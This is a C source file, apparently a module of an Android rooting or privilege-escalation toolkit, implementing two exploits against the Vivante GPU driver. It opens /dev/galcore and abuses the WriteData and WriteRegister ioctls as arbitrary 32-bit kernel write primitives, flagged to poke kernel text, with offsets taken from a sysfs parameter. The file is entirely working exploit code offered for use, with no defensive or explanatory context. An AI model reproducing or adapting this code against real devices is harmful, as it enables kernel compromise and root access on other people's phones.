
#include "log.h"
#include "exploit.h"
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>

static int vivante_init(void **opaque) {
    int fd;

    *opaque = (void *)(-1);
    fd = open("/dev/graphics/galcore", O_RDWR);
    if (fd < 0)
        fd = open("/dev/galcore", O_RDWR);
    if (fd < 0)
        return -1;
    *opaque = (void *) fd;
    return 0;
}

static void vivante_free(void **opaque) {
    int fd;

    fd = (int)(*opaque);
    if (fd >= 0)
        close(fd);
}
/*

#define gcdREGISTER_ACCESS_FROM_USER 1

$ cat /sys/module/galcore/parameters/registerMemBase
xxx

 */

typedef enum _gceHARDWARE_TYPE {
    gcvHARDWARE_INVALID = 0x00,
    gcvHARDWARE_3D      = 0x01,
    gcvHARDWARE_2D      = 0x02,
    gcvHARDWARE_VG      = 0x04,
    gcvHARDWARE_3D2D    = gcvHARDWARE_3D | gcvHARDWARE_2D
} gceHARDWARE_TYPE;

typedef struct _hwgc_ioctl_args {
    void *data_in;
    uint32_t size_in;
    void *data_out;
    uint32_t size_out;
} hwgc_ioctl_args;

typedef struct _hwgc_ioctl_data {
    int32_t command;
    int32_t hardwareType;
    int32_t status;
    int32_t handle;
    uint32_t pid;
    // a big union
    uint32_t addr;
    uint32_t val;
    char padding[132];
} hwgc_ioctl_data;

#define IOCTL_GCHAL_INTERFACE 30000
#define gcvHAL_WRITE_DATA     18
#define gcvHAL_WRITE_REGISTER 22

static int vivante_wdata_write32(void *opaque, long addr, long val) {
    int rc, fd;
    hwgc_ioctl_args args;
    hwgc_ioctl_data id, od;

    fd = (int) opaque;
    memset(&args, 0, sizeof(args));
    args.data_in = &id;
    args.size_in = sizeof(id);
    args.data_out = &od;
    args.size_out = sizeof(od);
    memset(&od, 0, sizeof(id));
    id.command = gcvHAL_WRITE_DATA;
    id.addr = (unsigned) addr;
    id.val = (unsigned) val;
    memset(&od, 0, sizeof(od));
    rc = ioctl(fd, IOCTL_GCHAL_INTERFACE, &args);
    if (rc)
        LOGE("ioctl()");
    return rc;
}


static int vivante_wreg_write32(void *opaque, long addr, long val) {
    int rc, fd, test = 0;
    char buff[16];
    unsigned long off;
    hwgc_ioctl_args args;
    hwgc_ioctl_data id, od;

    fd = open("/sys/module/galcore/parameters/registerMemBase", O_RDONLY);
    if (fd < 0)
        return -1;
    memset(buff, 0, sizeof(buff));
    rc = read(fd, buff, sizeof(buff));
    if (rc > 0) {
        test = 1;
        off = strtoul(buff, 0, 10);
    }
    close(fd);
    if (!test)
        return -1;
    fd = (int) opaque;
    memset(&args, 0, sizeof(args));
    args.data_in = &id;
    args.size_in = sizeof(id);
    args.data_out = &od;
    args.size_out = sizeof(od);
    memset(&od, 0, sizeof(id));
    id.command = gcvHAL_WRITE_REGISTER;
    // XXX: which is major?
    id.hardwareType = gcvHARDWARE_3D2D;
    id.addr = (unsigned) addr - off;
    id.val = (unsigned) val;
    memset(&od, 0, sizeof(od));
    rc = ioctl(fd, IOCTL_GCHAL_INTERFACE, &args);
    if (rc)
        LOGE("ioctl()");
    return rc;
}

exploit_t EXPLOIT_vivante_wdata = {
    .name = "Vivante WriteData",
    .flags = EXPLOIT_POKE_TEXT,
    .init = vivante_init,
    .free = vivante_free,
    .write32 = vivante_wdata_write32,
};

exploit_t EXPLOIT_vivante_wreg = {
    .name = "Vivante WriteRegisterEx",
    .flags = EXPLOIT_POKE_TEXT,
    .init = vivante_init,
    .free = vivante_free,
    .write32 = vivante_wreg_write32,
};

